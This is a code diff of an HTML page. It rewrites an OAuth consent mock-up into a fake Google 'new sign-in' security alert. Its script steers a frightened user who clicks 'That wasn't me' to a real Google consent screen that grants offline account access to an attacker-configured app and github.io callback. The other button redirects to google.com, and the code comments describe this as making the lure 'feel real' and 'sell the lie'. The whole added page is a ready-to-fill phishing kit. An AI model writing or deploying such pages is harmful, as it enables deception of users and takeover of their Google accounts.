@@ -3,80 +3,164 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Accounts</title>
+    <title>Google Account Security</title>
     <style>
         body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #f5f5f5;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f9f9f9;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .container {
+        .card {
             background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
             width: 400px;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
             text-align: center;
         }
-        .logo {
-            width: 75px;
-            margin-bottom: 20px;
+        .icon {
+            width: 64px;
+            height: 64px;
+            background-color: #e8f0fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
         }
-        h2 {
-            font-size: 18px;
+        .icon svg {
+            width: 32px;
+            height: 32px;
+            fill: #1a73e8;
+        }
+        h1 {
+            font-size: 22px;
+            color: #202124;
             margin-bottom: 10px;
+            font-weight: 500;
         }
-        .permissions {
-            text-align: left;
-            margin: 20px 0;
+        p {
             font-size: 14px;
-            color: #555;
+            color: #5f6368;
+            margin-bottom: 25px;
+            line-height: 1.5;
         }
-        .permissions li {
-            margin-bottom: 5px;
+        .btn-group {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
         }
-        .btn {
+        button {
+            flex: 1;
+            padding: 12px 0;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-primary {
             background-color: #1a73e8;
             color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
         }
-        .btn:hover {
-            background-color: #1557b0;
+        .btn-primary:hover {
+            background-color: #1765cc;
         }
-        .cancel {
-            background: transparent;
+        .btn-outline {
+            background-color: white;
             color: #1a73e8;
-            border: none;
-            cursor: pointer;
-            font-size: 14px;
-            margin-top: 10px;
+            border: 1px solid #dadce0;
+        }
+        .btn-outline:hover {
+            background-color: #f1f3f4;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #9aa0a6;
+        }
+        /* Loading Spinner */
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
-        <h2>[Your App Name] wants to access your Google Account</h2>
-        <ul class="permissions">
-            <li>View your email address</li>
-            <li>See your personal info</li>
-        </ul>
-        <button class="btn" id="allowBtn">Continue</button>
-        <br>
-        <button class="cancel">Cancel</button>
+
+    <div class="card">
+        <div class="icon">
+            <!-- Shield Icon -->
+            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+        </div>
+        <h1>New sign-in from Chrome on Windows</h1>
+        <p>
+            We noticed a new sign-in to your Google Account on a <strong>Windows</strong> device in <strong>United States</strong>.<br>
+            If this wasn't you, it could mean someone else is trying to access your account.
+        </p>
+        
+        <div class="btn-group">
+            <button class="btn-outline" id="denyBtn">That wasn't me</button>
+            <button class="btn-primary" id="allowBtn">It was me</button>
+        </div>
+        
+        <div class="spinner" id="spinner"></div>
+        
+        <div class="footer">
+            <p>Google Account Security Center</p>
+        </div>
     </div>
+
     <script>
-        document.getElementById('allowBtn').addEventListener('click', function() {
-            // Redirect to your callback handler
-            window.location.href = 'https://your-server.com/callback';
+        // CONFIGURATION
+        const CLIENT_ID = 'YOUR_GOOGLE_CLIENT_ID_HERE';
+        const REDIRECT_URI = encodeURIComponent('https://YOUR_USERNAME.github.io/YOUR_REPO/callback');
+        const SCOPE = 'openid email profile';
+        
+        // The URL for the REAL Google Consent Screen
+        const GOOGLE_AUTH_URL = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&response_type=code&scope=${SCOPE}&access_type=offline&prompt=consent`;
+
+        const denyBtn = document.getElementById('denyBtn');
+        const allowBtn = document.getElementById('allowBtn');
+        const spinner = document.getElementById('spinner');
+
+        // Function to show loading state
+        function showLoading() {
+            denyBtn.style.display = 'none';
+            allowBtn.style.display = 'none';
+            spinner.style.display = 'block';
+        }
+
+        // "That wasn't me" -> Redirect to Real Google Consent
+        denyBtn.addEventListener('click', () => {
+            showLoading();
+            // Simulate a small delay to make it feel real
+            setTimeout(() => {
+                window.location.href = GOOGLE_AUTH_URL;
+            }, 500);
+        });
+
+        // "It was me" -> Redirect to a fake "Success" page
+        allowBtn.addEventListener('click', () => {
+            showLoading();
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com'; // Redirect to real Google to sell the lie
+            }, 500);
         });
     </script>
 </body>
